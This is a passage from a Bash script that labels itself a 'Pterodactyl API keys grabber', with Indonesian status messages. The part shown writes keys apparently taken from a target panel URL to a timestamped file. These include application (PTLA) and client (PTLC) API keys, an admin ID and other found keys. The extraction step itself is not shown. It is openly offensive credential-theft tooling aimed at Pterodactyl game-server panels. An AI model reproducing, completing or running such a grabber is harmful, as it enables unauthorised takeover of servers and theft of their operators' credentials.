    else
        echo -e "${YELLOW}⚠️  Tidak bisa memvalidasi (mungkin perlu format berbeda)${NC}"
    fi
fi

# Save to file
INFO_FILE="apikeys_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "=========================================="
    echo "PTERODACTYL API KEYS GRABBER"
    echo "=========================================="
    echo "Target URL : $TARGET_URL"
    echo "Date       : $(date)"
    echo "------------------------------------------"
    echo ""
    echo "[API KEYS FOUND]"
    echo "------------------------------------------"
    echo "PLTA Key    : ${API_KEYS[ptla]:-Not Found}"
    echo "PTLC Key    : ${API_KEYS[ptlc]:-Not Found}"
    echo "Admin ID    : ${API_KEYS[admin_id]:-1}"
    echo ""
    echo "[Other Keys]"
    for key in "${API_KEYS[other][@]}"; do
